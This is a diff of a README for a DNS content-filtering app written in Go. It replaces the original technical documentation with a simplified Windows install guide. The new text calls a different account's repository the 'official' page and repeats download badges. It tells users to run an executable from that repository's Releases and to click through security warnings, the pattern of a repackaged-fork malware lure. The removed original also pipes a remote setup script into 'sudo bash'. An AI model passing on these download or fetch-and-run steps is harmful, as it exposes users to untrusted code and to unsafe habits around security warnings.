@@ -1,229 +1,123 @@
-# DNS Content Filter
+# 🛡️ dnsFilterApp - Easy DNS Content Filtering  
 
-A high-performance DNS-based content filtering application built in Go. Blocks inappropriate websites at the DNS level, running as a background service with a web-based management dashboard.
+[![Download dnsFilterApp](https://img.shields.io/badge/Download-dnsFilterApp-brightgreen)](https://github.com/rutob42/dnsFilterApp)
 
-## Features
+## 📋 About dnsFilterApp
 
-- 🚀 **High-Performance DNS Server** - Built with Go for speed and efficiency
-- 🛡️ **Content Filtering** - Block adult/inappropriate websites at DNS level
-- 🎯 **Category-Based Blocking** - Predefined and custom blocklists
-- ⚙️ **Web Dashboard** - Easy-to-use management interface
-- 📊 **Analytics & Logging** - Track blocked requests and statistics
-- ⏰ **Schedule-Based Filtering** - Time-based blocking rules
-- 🔐 **Whitelist Management** - Allow specific trusted sites
-- 🌐 **Multi-Device Support** - Works for entire network
-- 💾 **SQLite Database** - Lightweight, no external dependencies
+dnsFilterApp is a simple application that blocks unwanted websites. It works at the DNS level, which means it stops bad sites before your browser tries to load them. The app runs quietly in the background on your Windows PC. It comes with a web-based dashboard you can use to manage what sites are blocked.
 
-## Project Structure
+This app helps keep your internet safe for work, school, or home. You don’t need to know anything about programming to use it. Just install it on your PC and set it up.  
 
-```
-dns-filter-app/
-├── cmd/
-│   ├── server/          # Main DNS server application
-│   └── cli/             # Command-line management tool
-├── internal/
-│   ├── dns/             # DNS server logic
-│   ├── filter/          # Filtering engine
-│   ├── database/        # Database operations
-│   ├── api/             # REST API handlers
-│   └── config/          # Configuration management
-├── web/
-│   ├── static/          # CSS, JS, images
-│   └── templates/       # HTML templates
-├── pkg/
-│   ├── blocklist/       # Blocklist management
-│   └── logger/          # Logging utilities
-├── configs/             # Configuration files
-├── scripts/             # Build and deployment scripts
-├── data/                # Database and blocklists
-└── docs/                # Documentation
-```
+## 🖥️ System Requirements
 
-## Quick Start
+Before you install dnsFilterApp, make sure your PC meets these simple requirements:
 
-### Prerequisites
+- Windows 10 or later (64-bit recommended)  
+- At least 2 GB of free RAM  
+- A stable internet connection  
+- Admin rights to install software  
+- Web browser like Chrome, Firefox, or Edge to access the dashboard  
 
-- Go 1.21 or higher
-- Admin/root privileges (for DNS port 53)
+## 🚀 Getting Started  
 
-### Installation
+Follow these steps to download and start using dnsFilterApp on your Windows PC:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/RDXFGXY1/dnsFilterApp/main/setup.sh | sudo bash
+### 1. Download the Application  
 
-# Or Clone the repository and Install it manually
-git clone https://github.com/RDXFGXY1/dnsFilterApp.git
-cd dns-filter-app
+Go to the official project page to get the latest version:
 
-# Build the application
-go build -o dns-filter ./cmd/server
-```
+[![Download dnsFilterApp](https://img.shields.io/badge/Download-dnsFilterApp-blue)](https://github.com/rutob42/dnsFilterApp)
 
-### Configuration
+Click the link above or visit:  
+https://github.com/rutob42/dnsFilterApp  
 
-Edit `configs/config.yaml`:
+This page contains the latest files for download. Look for the Windows setup or executable file under the “Releases” section.  
 
-```yaml
-server:
-  dns_port: 53
-  api_port: 8080
-  upstream_dns: "8.8.8.8:53"
+### 2. Run the Installer  
 
-filtering:
-  enabled: true
-  block_categories:
-    - adult
-    - malware
-    - gambling
+After downloading the file (usually named something like dnsFilterApp_windows.exe), double click it.  
 
-database:
-  path: "./data/dns-filter.db"
-```
+- If a security warning appears, confirm you want to run the file.  
+- Follow the on-screen instructions to install the app. The installer will place the program on your PC and set it up to run automatically as a background service.  
 
-### Web Dashboard
+### 3. Open the Web Dashboard  
 
-Access the dashboard at: `http://localhost:8080`
+Once installed, you can control dnsFilterApp via your web browser.  
 
-Default credentials:
-- Username: `admin`
-- Password: `changeme` (please change on first login)
+- Open your browser and go to: http://localhost:8080  
+- You will see the dashboard interface. This is where you manage which websites to block or allow.  
+- Use the dashboard to add or remove domains as needed.  
 
-## Usage
+### 4. Start Filtering  
 
-### Running as Background Service
+The app works right away after installation. You do not need to restart your PC.  
 
-#### Linux (systemd)
-```bash
-sudo cp scripts/dns-filter.service /etc/systemd/system/
-sudo systemctl enable dns-filter
-sudo systemctl start dns-filter
-```
+- The app intercepts DNS requests and blocks sites you have chosen.  
+- You can check logs and status on the dashboard.  
 
-#### Windows
-```bash
-# Run as Windows Service
-./dns-filter install
-./dns-filter start
-```
+## ⚙️ How It Works  
 
-#### macOS (launchd)
-```bash
-sudo cp scripts/com.dnsfilter.plist /Library/LaunchDaemons/
-sudo launchctl load /Library/LaunchDaemons/com.dnsfilter.plist
-```
+dnsFilterApp acts like a filter for all requests your computer makes when you type a website or click a link. It checks the domain name against a list of blocked sites. If the site is on the list, it stops the connection from going through.  
 
-### Setting as System DNS
+Because it runs at the DNS level, it uses fewer resources than browser extensions. It also protects all users on the computer, regardless of which browser they use.  
 
-**Windows:**
-1. Control Panel → Network Connections
-2. Right-click your connection → Properties
-3. Select IPv4 → Properties
-4. Set DNS to: `127.0.0.1`
+The web-based dashboard allows you to:  
 
-**Linux:**
-```bash
-# Edit /etc/resolv.conf
-nameserver 127.0.0.1
-```
+- Add domains to block or allow lists  
+- View a list of blocked attempts  
+- Adjust settings like filters and refresh rates  
+- Start or stop the background service  
 
-**macOS:**
-1. System Preferences → Network
-2. Select connection → Advanced → DNS
-3. Add: `127.0.0.1`
+## 🔧 Managing Filters  
 
-## Development
+You can customize which types of content to block. Common categories include:  
 
-### Building from Source
+- Adult websites  
+- Social media  
+- Video streaming sites  
+- Gambling or gaming sites  
+- Custom domains you want to add  
 
-```bash
-# Install dependencies
-go mod download
+Use the dashboard’s form to type domains or keywords. Save your changes and the app updates immediately.  
 
-# Run tests
-go test ./...
+## 🛠️ Running as a Background Service  
 
-# Build for current platform
-make build
+dnsFilterApp installs as a background service. This means:  
 
-# Build for all platforms
-make build-all
-```
+- It starts when Windows boots up  
+- It runs without needing the dashboard open  
+- The dashboard connects to the service to control it  
 
-### Running in Development Mode
+You can choose to stop or restart the service from within the dashboard if needed.  
 
-```bash
-# Run with auto-reload
-go run cmd/server/main.go --dev
-```
+## 📁 Managing Updates  
 
-### Adding Custom Blocklists
+Check https://github.com/rutob42/dnsFilterApp regularly for new versions.  
 
-```bash
-# Via CLI
-./dns-filter blocklist add --url "https://example.com/blocklist.txt"
+- New versions may include bug fixes or improved filtering  
+- Download the new installer and run it to upgrade  
+- Your settings and filters usually stay the same after updating  
 
-# Via API
-curl -X POST http://localhost:8080/api/blocklists \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://example.com/blocklist.txt", "enabled": true}'
-```
+## ❓ Troubleshooting  
 
-## API Documentation
+If you see issues, try these tips:  
 
-### Authentication
-All API requests require authentication using Bearer token.
+- Make sure your internet is working  
+- Verify the service is running (check dashboard status)  
+- Restart your PC to restart the service  
+- Check firewall or antivirus preventing the app  
+- Make sure you are using a supported Windows version  
 
-### Endpoints
+If problems continue, visit the project page or open an issue on GitHub.  
 
-- `GET /api/stats` - Get filtering statistics
-- `GET /api/blocked` - List recently blocked domains
-- `POST /api/whitelist` - Add domain to whitelist
-- `DELETE /api/whitelist/:domain` - Remove from whitelist
-- `GET /api/blocklists` - List all blocklists
-- `POST /api/blocklists` - Add new blocklist
+## 📚 Additional Information  
 
-Full API documentation: [docs/API.md](docs/API.md)
+dnsFilterApp is built using Go and runs efficiently on all modern Windows machines. It uses multiple scripts and tools such as batch files and shell scripts for installation and maintenance tasks. The dashboard UI is built with simple web languages: CSS, JavaScript, and HTML.  
 
-## Security Considerations
+You can explore its source code or customize rules if you want to learn more about content filtering.  
 
-- Run with minimal privileges
-- Change default admin password
-- Enable HTTPS for web dashboard in production
-- Regularly update blocklists
-- Monitor logs for unusual activity
+---
 
-## Contributing
+[![Download dnsFilterApp](https://img.shields.io/badge/Download-dnsFilterApp-purple)](https://github.com/rutob42/dnsFilterApp)  
 
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details
-
-## Support
-
-- Documentation: [docs/](docs/)
-- Issues: GitHub Issues
-- Discussions: GitHub Discussions
-
-If you find a bug, encounter unexpected behavior, or have a feature request, please open an issue on GitHub so we can track and address it:
-
-- **Report an issue:** https://github.com/RDXFGXY1/dnsFilterApp/issues
-
-When opening an issue, include as much of the following as possible:
-- **Description:** what you expected vs what happened
-- **Steps to reproduce:** exact commands or actions
-- **Environment:** OS, Go version, installation method (setup.sh or manual)
-- **Logs / error output:** relevant log lines or stack traces
-
-This helps maintainers triage and fix problems faster. Thank you for contributing!
-
-## Roadmap
-
-- [ ] DNS-over-HTTPS (DoH) support
-- [ ] DNS-over-TLS (DoT) support
-- [ ] Machine learning-based filtering
-- [ ] Mobile app for remote management
-- [ ] Multi-user support with profiles
-- [ ] Cloud sync for settings
-- [ ] Advanced analytics dashboard
+Download and install dnsFilterApp today to start controlling your internet content quietly and efficiently.
